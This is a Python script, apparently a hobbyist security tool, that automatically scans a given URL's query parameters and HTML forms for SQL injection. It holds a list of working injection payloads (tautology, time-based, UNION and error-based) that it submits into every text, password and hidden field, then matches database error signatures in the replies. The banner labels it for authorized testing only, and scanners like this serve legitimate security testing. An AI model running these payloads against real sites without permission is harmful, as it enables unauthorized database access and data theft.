#!/usr/bin/env python3
"""
SQL Injection Tester Tool 🧪
Author: hemanathan115
GitHub: https://github.com/hemanathan115
Description: Tests web forms for SQL injection vulnerabilities using common payloads.
"""

import requests
import argparse
import sys
import time
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

init(autoreset=True)

# ─────────────────────────────────────────────
# Common SQL Injection Payloads
# ─────────────────────────────────────────────
PAYLOADS = [
    # Classic
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 1=1#",
    "admin' --",
    "admin'/*",
    "' OR 'x'='x",

    # Boolean-based
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND '1'='1",
    "1' AND '1'='2",

    # Time-based (MySQL)
    "'; WAITFOR DELAY '0:0:5' --",
    "1; SELECT SLEEP(5)--",
    "' OR SLEEP(5) --",

    # UNION-based
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT NULL, NULL, NULL --",

    # Error-based
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION())) --",
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",

    # Generic
    "\" OR \"\"=\"",
    "OR 1=1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
]

# Strings that hint at SQL error responses
ERROR_SIGNATURES = [
    "sql syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "you have an error in your sql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error",
    "odbc microsoft access driver",
    "sqlstate",
    "ora-",
    "sqlite_error",
    "pg_query",
    "postgresql",
    "warning: mysql",
    "invalid query",
    "sql command not properly ended",
    "microsoft ole db provider",
    "error in your sql",
    "native client",
    "jdbc",
    "[microsoft][odbc",
    "supplied argument is not a valid mysql",
]


def banner():
    print(Fore.CYAN + r"""
 ____   ___  _       ___       _           _   _
/ ___| / _ \| |     |_ _|_ __ (_) ___  ___| |_(_) ___  _ __
\___ \| | | | |      | || '_ \| |/ _ \/ __| __| |/ _ \| '_ \
 ___) | |_| | |___   | || | | | |  __/ (__| |_| | (_) | | | |
|____/ \__\_\_____|  |___|_| |_|_|\___|\___|\__|_|\___/|_| |_|

         ████████╗███████╗███████╗████████╗███████╗██████╗
            ██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
            ██║   █████╗  ███████╗   ██║   █████╗  ██████╔╝
            ██║   ██╔══╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗
            ██║   ███████╗███████║   ██║   ███████╗██║  ██║
            ╚═╝   ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

    """ + Style.RESET_ALL)
    print(Fore.YELLOW + "   SQL Injection Tester 🧪 | By hemanathan115 | GitHub: hemanathan115" + Style.RESET_ALL)
    print(Fore.RED + "   ⚠️  For educational & authorized testing ONLY. Unauthorized use is illegal." + Style.RESET_ALL)
    print("=" * 70)


def get_forms(url, session):
    """Extract all forms from a given URL."""
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except Exception as e:
        print(Fore.RED + f"[ERROR] Could not fetch page: {e}")
        return []


def get_form_details(form):
    """Extract form action, method, and input fields."""
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        if input_name:
            inputs.append({"type": input_type, "name": input_name, "value": input_value})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def is_vulnerable(response_text):
    """Check if response contains SQL error signatures."""
    response_lower = response_text.lower()
    for sig in ERROR_SIGNATURES:
        if sig in response_lower:
            return True, sig
    return False, None


def submit_form(form_details, url, payload, session):
    """Submit the form with a given payload injected into fields."""
    target_url = urljoin(url, form_details["action"]) if form_details["action"] else url
    data = {}

    for input_field in form_details["inputs"]:
        if input_field["type"] in ("text", "search", "email", "password", "hidden"):
            data[input_field["name"]] = payload
        else:
            data[input_field["name"]] = input_field["value"]

    try:
        if form_details["method"] == "post":
            return session.post(target_url, data=data, timeout=10)
        else:
            return session.get(target_url, params=data, timeout=10)
    except Exception as e:
        print(Fore.RED + f"  [ERROR] Request failed: {e}")
        return None


def test_url_params(url, session):
    """Test URL query parameters directly for SQL injection."""
    parsed = urlparse(url)
    if not parsed.query:
        return

    print(Fore.BLUE + "\n[*] Testing URL Query Parameters...")
    from urllib.parse import parse_qs, urlencode

    params = parse_qs(parsed.query, keep_blank_values=True)
    vulnerable_params = []

    for param in params:
        for payload in PAYLOADS:
            test_params = dict(params)
            test_params[param] = [payload]
            test_query = urlencode(test_params, doseq=True)
            test_url = parsed._replace(query=test_query).geturl()

            try:
                response = session.get(test_url, timeout=10)
                vuln, sig = is_vulnerable(response.text)
                if vuln:
                    print(Fore.RED + f"  [VULNERABLE] Param: '{param}' | Payload: {payload[:40]} | Signature: '{sig}'")
                    vulnerable_params.append(param)
                    break
            except Exception:
                pass

    if not vulnerable_params:
        print(Fore.GREEN + "  [SAFE] No SQL injection found in URL parameters.")


def scan(url, delay=0.5, output_file=None):
    """Main scan function."""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (SQLi-Tester/1.0; Educational Tool)"
    })

    results = []
    print(Fore.CYAN + f"\n[*] Scanning: {url}")
    print(Fore.CYAN + f"[*] Total payloads: {len(PAYLOADS)}\n")

    # Test URL parameters
    test_url_params(url, session)

    # Test forms
    forms = get_forms(url, session)
    print(Fore.BLUE + f"\n[*] Found {len(forms)} form(s) on the page.")

    for i, form in enumerate(forms):
        form_details = get_form_details(form)
        print(Fore.YELLOW + f"\n[FORM {i+1}] Action: {form_details['action'] or url} | Method: {form_details['method'].upper()}")
        print(f"  Fields: {[f['name'] for f in form_details['inputs']]}")

        form_vulnerable = False
        for payload in PAYLOADS:
            time.sleep(delay)
            response = submit_form(form_details, url, payload, session)
            if response is None:
                continue

            vuln, sig = is_vulnerable(response.text)
            if vuln:
                msg = (f"  [VULNERABLE ⚠️ ] Payload: {payload[:50]} | "
                       f"Signature: '{sig}' | Status: {response.status_code}")
                print(Fore.RED + msg)
                results.append({"form": i+1, "payload": payload, "signature": sig})
                form_vulnerable = True

        if not form_vulnerable:
            print(Fore.GREEN + f"  [SAFE ✅] No SQL injection detected in Form {i+1}.")

    # Summary
    print("\n" + "=" * 70)
    if results:
        print(Fore.RED + f"[!] SCAN COMPLETE: {len(results)} vulnerability/vulnerabilities found!")
    else:
        print(Fore.GREEN + "[✓] SCAN COMPLETE: No SQL injection vulnerabilities detected.")
    print("=" * 70)

    if output_file:
        import json
        with open(output_file, "w") as f:
            json.dump({"target": url, "vulnerabilities": results}, f, indent=2)
        print(Fore.CYAN + f"[*] Results saved to: {output_file}")

    return results


def main():
    banner()
    parser = argparse.ArgumentParser(
        description="SQL Injection Tester 🧪 - Tests web forms for SQL injection vulnerabilities."
    )
    parser.add_argument("url", help="Target URL to test (e.g., http://testphp.vulnweb.com/login.php)")
    parser.add_argument("--delay", type=float, default=0.3, help="Delay between requests in seconds (default: 0.3)")
    parser.add_argument("--output", type=str, help="Save results to a JSON file (e.g., results.json)")

    args = parser.parse_args()

    if not args.url.startswith(("http://", "https://")):
        print(Fore.RED + "[ERROR] URL must start with http:// or https://")
        sys.exit(1)

    scan(args.url, delay=args.delay, output_file=args.output)


if __name__ == "__main__":
    main()
